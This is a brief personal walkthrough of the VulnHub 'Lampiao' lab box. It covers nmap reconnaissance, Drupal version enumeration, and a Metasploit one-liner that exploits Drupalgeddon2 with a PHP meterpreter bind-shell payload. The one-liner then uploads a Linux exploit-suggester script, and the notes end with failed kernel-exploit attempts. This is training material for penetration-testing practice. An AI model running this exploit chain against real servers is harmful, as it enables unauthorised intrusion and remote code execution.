#Reconnaissance 
Nmap scan. 
Found port 1898 open, which was found to be running drupal
Looked for Drupal enumeration apps and was able to find "Drupwn" on github. Installed and executed, discovering the running version was likely to be 8.x

Searchsploit contained several entries for "DrupalGeddon"

msfconsole
search drupal
```
msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2;\
set payload php/meterpreter/bind_tcp;\
set rport 1898;\
set rhost $tgt;\
exploit;\
cd ~/toolz;\
upload ~/toolz/les.sh /tmp/"
```
notes 
uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
![[Pasted image 20220609223956.png]]

Several of the Ubuntu related exploits are inapplicable as they apply to version 16.04
Chocoboroot fails due to the arch not being applicable (i686)

After executing a large number of manual enumeration steps, checked other guides. The majority of users achieved root by using the Linux Exploit Suggester script, which feels sort of cheap compared to the typically OffSec box (granted, this is vanilla vuln-hub).